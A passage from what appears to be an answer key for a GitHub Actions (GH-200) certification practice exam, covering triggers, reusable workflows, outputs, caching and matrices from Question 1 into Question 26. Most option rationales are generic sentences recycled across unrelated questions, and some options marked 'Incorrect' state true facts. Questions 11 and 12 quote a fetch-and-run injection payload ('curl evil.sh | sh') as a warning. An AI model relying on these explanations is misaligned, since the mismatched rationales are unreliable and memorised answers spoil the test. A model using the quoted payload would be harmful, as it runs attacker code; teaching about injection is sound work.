- **B:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `on: schedule` workflows trigger ONLY from the workflow file committed on the repository's default branch (`main`), so a cron workflow present solely on `dev/substation` never executes automatically.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.

### Question 2 — `A, B` (Author and manage workflows)

Correct answers: A and B (are correct). By default, `on: pull_request` fires on `opened`, `synchronize`, and `reopened` (`requiring explicit types: [labeled, ready_for_review, ...] for extra activity types`), and repositories using Merge Queues MUST add `merge_group:` to required workflows so queued merge commits trigger status checks. [Skill 1.1: Configure workflows for scheduled, manual, and webhook events | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)]

- **A:** Correct. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
- **B:** Correct. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **E:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **F:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).

### Question 3 — `A` (Author and manage workflows)

Correct answer: A (is correct). Setting `cancel-in-progress: false` (`the default when omitted`) allows at most one active run AND one pending queued run per concurrency group so an in-progress deployment finishes safely before the newest queued deployment starts. [Skill 1.2: Define workflow scope, permissions, event filters, and concurrency controls | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow)]

- **A:** Correct. Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.
- **B:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 4 — `E, F` (Author and manage workflows)

Correct answers: E and F (are correct). Workflow-level `defaults.run` sets default `shell` and `working-directory` for `run:` steps (`overridden by job-level defaults.run or step-level shell/working-directory`), and `env:` variables resolve with precedence `Step > Job > Workflow` (`without affecting uses: action steps via defaults.run`). [Skill 1.2: Define workflow scope, permissions, event filters, and concurrency controls | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **E:** Correct. Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.
- **F:** Correct. Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.

### Question 5 — `B` (Author and manage workflows)

Correct answer: B (is correct). Declare BOTH `workflow_call:` and `workflow_dispatch:` under `on:` (`mapping inputs via inputs.<name> || github.event.inputs.<name>`) so the workflow exposes the UI `Run workflow` button while remaining callable via `jobs.<id>.uses`. [Skill 1.3: Design workflows using inputs and reusable configuration patterns | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs)]

- **A:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **B:** Correct. `workflow_dispatch` provides rich UI-validated input types (`up to 10 inputs`), while `workflow_call` validates reusable-workflow `inputs` and `secrets`.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 6 — `C` (Author and manage workflows)

Correct answer: C (is correct). Declaring `on: workflow_call` (`inputs`, `secrets`, `outputs`), writing step `$GITHUB_OUTPUT` + job `outputs`, invoking `jobs.<id>.uses` (`@<sha>`) with `with:` & `secrets:`, and reading `needs.<id>.outputs.<key>` wires cross-workflow data cleanly. [Skill 1.3: Design workflows using inputs and reusable configuration patterns | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs)]

- **A:** Incorrect. Reusable workflows must live in `.github/workflows/`, be invoked at `jobs.<id>.uses` (not `steps:`), and map secrets/outputs explicitly.
- **B:** Incorrect. A reusable workflow fails without `on: workflow_call`, `$GITHUB_ENV` never crosses jobs, and passing secrets in `with:` leaks plaintext.
- **C:** Correct. Reusable workflows map step `$GITHUB_OUTPUT` -> job `outputs` -> `on.workflow_call.outputs`, which caller jobs read via `needs.<id>.outputs`.
- **D:** Incorrect. `workflow_dispatch` cannot be called by `uses:`, `::set-output` is retired, and downstream jobs must `needs:` the reusable workflow job.

### Question 7 — `A` (Author and manage workflows)

Correct answer: A (is correct). Step-level `if: failure()` evaluates to `true` strictly when at least one previous step in the same job failed (`and false on success or cancellation`), whereas omitting a status function implicitly wraps conditions with `success() && (...)`. [Skill 1.4: Structure jobs, steps, conditional logic, timeouts, and error-handling behavior | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-conditions-to-control-job-execution)]

- **A:** Correct. Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 8 — `D` (Author and manage workflows)

Correct answer: D (is correct). Setting step-level `timeout-minutes: 4` directly on the `flash-bench` step kills that runaway step after 4 minutes (`allowing subsequent if: failure() diagnostic steps in the same job to still collect serial logs`). [Skill 1.4: Structure jobs, steps, conditional logic, timeouts, and error-handling behavior | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-conditions-to-control-job-execution)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Correct. Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.

### Question 9 — `A` (Author and manage workflows)

Correct answer: A (is correct). By default, a job with `needs:` runs only if ALL upstream jobs `succeeded`; setting `if: !failure() && !cancelled() && needs.unit-test.result == 'success'` (`using always()/!cancelled() + needs.<id>.result`) allows `summary-gate` to proceed when optional `canary-check` is `'skipped'`. [Skill 1.5: Manage job dependencies and execution order | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow#defining-prerequisite-jobs)]

- **A:** Correct. Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.
- **B:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 10 — `B` (Author and manage workflows)

Correct answer: B (is correct). No — `$GITHUB_ENV` variables stay confined to subsequent steps within the SAME job; cross-job scalars must be written to `$GITHUB_OUTPUT`, exposed under `jobs.plan-shards.outputs`, and read via `${{ needs.plan-shards.outputs.shard_count }}`. [Skill 1.5: Manage job dependencies and execution order | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow#defining-prerequisite-jobs)]

- **A:** Incorrect. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.
- **B:** Correct. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `$GITHUB_ENV` variables stay confined to subsequent steps within the SAME job; cross-job scalars must be written to `$GITHUB_OUTPUT`, exposed under `jobs.plan-shards.outputs`, and read via `${{ needs.plan-shards.outputs.shard_count }}`.
- **D:** Incorrect. Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.

### Question 11 — `B` (Author and manage workflows)

Correct answer: B (is correct). Printing `::group::<Title>` and `::endgroup::` to stdout creates an expandable/collapsible section inside the Actions UI step log viewer (`while ::warning:: and ::notice:: attach structured annotations`). [Skill 1.6: Use workflow commands and environment files to control job execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Correct. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **C:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 12 — `A, B, D` (Author and manage workflows)

Correct answers: A, B, and D (are correct). Generate a random unique delimiter (`EOF_$(openssl rand -hex 8)`) when writing multi-line values to `$GITHUB_OUTPUT` / `$GITHUB_ENV`, emit `::add-mask::<secret>` BEFORE printing or exporting dynamic credentials, and avoid retired `::set-output` / `::save-state` stdout commands. [Skill 1.6: Use workflow commands and environment files to control job execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions)]

- **A:** Correct. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **B:** Correct. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.
- **C:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **D:** Correct. `$GITHUB_OUTPUT` paired with `jobs.<id>.outputs` is the supported mechanism for passing string metadata between separate jobs.
- **E:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **F:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 13 — `B` (Author and manage workflows)

Correct answer: B (is correct). When a job itself runs inside `container:`, GitHub Actions attaches both the job container and all `services:` containers to the same user-defined Docker bridge network, so steps connect directly via service label hostname `mosquitto:1883` (`without host port mapping`). [Skill 1.7: Configure service containers and containerized job environments | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)]

- **A:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **B:** Correct. Service containers spin up sidecar databases/queues with Docker health probes; host steps use mapped `localhost` ports whereas job containers use service labels.
- **C:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 14 — `D` (Author and manage workflows)

Correct answer: D (is correct). Adding `credentials: { username: ${{ github.actor }}, password: ${{ secrets.GITHUB_TOKEN }} }` (`or a scoped registry secret`) inside `services.timescale` authenticates Docker image pulls for private job/service containers. [Skill 1.7: Configure service containers and containerized job environments | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Correct. Service containers spin up sidecar databases/queues with Docker health probes; host steps use mapped `localhost` ports whereas job containers use service labels.

### Question 15 — `C` (Author and manage workflows)

Correct answer: C (is correct). GitHub retired `ubuntu-20.04` and `windows-2019` hosted images; workflows should migrate to supported `ubuntu-22.04` / `ubuntu-24.04` (`ubuntu-latest`) and `windows-2022` / `windows-2025` (`windows-latest`). [Skill 1.8: Implement matrix strategies to run workflows across multiple configurations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Correct. Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 16 — `A, B` (Author and manage workflows)

Correct answers: A and B (are correct). Because `{ arch: x86_64, profile: sim }` does not match any existing `2 x 2` cartesian product entry, `include:` APPENDS a 5th standalone matrix job (`total = 5 jobs`), and `max-parallel: 2` + `fail-fast: false` runs at most 2 jobs concurrently without canceling siblings on error. [Skill 1.8: Implement matrix strategies to run workflows across multiple configurations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow)]

- **A:** Correct. `fail-fast: false` lets all matrix variants finish reporting test results, and explicit image labels prevent unexpected `*-latest` migration breakages.
- **B:** Correct. Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **E:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **F:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.

### Question 17 — `D` (Author and manage workflows)

Correct answer: D (is correct). Attach `&linux_targets` directly onto the first valid schema node (`for example strategy.matrix.os: &linux_targets [ubuntu-22.04, ubuntu-24.04]` in job 1) and reference `os: *linux_targets` in subsequent jobs within the same `.yml` file (`since unknown top-level keys fail Actions schema validation`). [Skill 1.9: Simplify workflow definitions using YAML anchors and aliases within a workflow file | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. GitHub Actions natively parses YAML 1.1/1.2 node anchors (`&`), aliases (`*`), and map merges (`<<:`) within the same workflow file.

### Question 18 — `C` (Author and manage workflows)

Correct answer: C (is correct). `${{ runner.temp }}` (`or environment variable $RUNNER_TEMP`) resolves to the runner's per-job temporary directory (`cleaned automatically after each job`), alongside `runner.os` (`Linux`, `Windows`, `macOS`) and `runner.arch` (`X64`, `ARM64`). [Skill 1.10: Reference actions and workflows using appropriate contexts and immutable references | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.
- **D:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.

### Question 19 — `A` (Author and manage workflows)

Correct answer: A (is correct). Pin Docker `uses:` (`or job container:/services:`) references by immutable OCI manifest digest `uses: docker://alpine@sha256:<64-hex-chars>` rather than a mutable `:3.20` or `:latest` image tag. [Skill 1.10: Reference actions and workflows using appropriate contexts and immutable references | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs)]

- **A:** Correct. Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!

### Question 20 — `A` (Author and manage workflows)

Correct answer: A (is correct). Built-in `contains(github.event.pull_request.labels.*.name, 'run-hil')` searches an array extracted via object filter `*` (`case-insensitive for strings`), and `startsWith(searchString, searchValue)` checks string prefixes. [Skill 1.11: Write expressions using built-in functions and conditional operators | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions)]

- **A:** Correct. Built-in expression functions enable dynamic JSON matrices (`fromJSON`) and lockfile cache keys (`hashFiles`) without shell-parsing overhead.
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 21 — `D` (Author and manage workflows)

Correct answer: D (is correct). When authenticated to the repository, the GitHub Actions VS Code extension resolves repository/organization `secrets` names and `vars` values/names, fetches `action.yml` / `workflow_call` input schemas for autocomplete, and flags invalid context access in real time. [Skill 1.12: Author and validate workflows using IDE extensions and developer tooling | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/quickstart)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Correct. The official GitHub Actions VS Code extension validates workflow syntax, autocompletes action `with:` inputs and `vars`/`secrets`, and inspects runs in-editor.

### Question 22 — `B` (Author and manage workflows)

Correct answer: B (is correct). Cache scope isolation lets a feature/PR branch restore matching `key` or `restore-keys` entries created in the CURRENT branch (`feat/modbus`), the base branch (`for PRs`), OR the repository's default branch (`main`), but NEVER from unrelated sibling feature branches. [Skill 1.13: Configure dependency caching and manage workflow artifacts and retention | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows)]

- **A:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **B:** Correct. Caches accelerate cross-run package restores (`evicted after 7 unused days or >10 GB`), whereas artifacts persist build outputs per workflow run.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 23 — `D` (Author and manage workflows)

Correct answer: D (is correct). Pass the `42 MB` binary file via `actions/upload-artifact@v4` + `actions/download-artifact@v4`, and pass the lightweight SHA-256 string via `$GITHUB_OUTPUT` -> `jobs.compile-arm.outputs.sha256` -> `needs.compile-arm.outputs.sha256`. [Skill 1.14: Pass data between steps and jobs using outputs, environment variables, and artifacts | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/passing-information-between-jobs)]

- **A:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **B:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.

### Question 24 — `B` (Author and manage workflows)

Correct answer: B (is correct). Each individual step can upload at most `1 MB` (`1,024 KB`) to `$GITHUB_STEP_SUMMARY` before truncation/error, and truncating or removing the file (`> "$GITHUB_STEP_SUMMARY"` or `rm "$GITHUB_STEP_SUMMARY"`) clears content written earlier within that same step (`never affecting prior steps`). [Skill 1.15: Publish job summaries and configure workflow status badges | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions#adding-a-job-summary)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Correct. Appending Markdown to `$GITHUB_STEP_SUMMARY` renders rich test/coverage reports on the workflow run summary page.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 25 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). No — `pull_request_target` executes in the base repository context with write-capable `GITHUB_TOKEN` and repository secrets; checking out and executing untrusted fork `head.sha` code (`pytest` / `setup.py`) lets attackers steal secrets and push malicious code (`use unprivileged pull_request instead`). [Skill 2.1: Predict workflow behavior based on event payloads, triggers, and configuration | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs)]

- **A:** Incorrect. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
- **B:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `pull_request_target` executes in the base repository context with write-capable `GITHUB_TOKEN` and repository secrets; checking out and executing untrusted fork `head.sha` code (`pytest` / `setup.py`) lets attackers steal secrets and push malicious code (`use unprivileged pull_request instead`).
- **C:** Correct. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **D:** Incorrect. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.

### Question 26 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). Exactly `1` run starts (`for pull_request`), because `push` is filtered to `branches: [main]` (`had push omitted branches:, pushing to feat/parser would have triggered DUPLICATE push + pull_request runs`). [Skill 2.1: Predict workflow behavior based on event payloads, triggers, and configuration | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
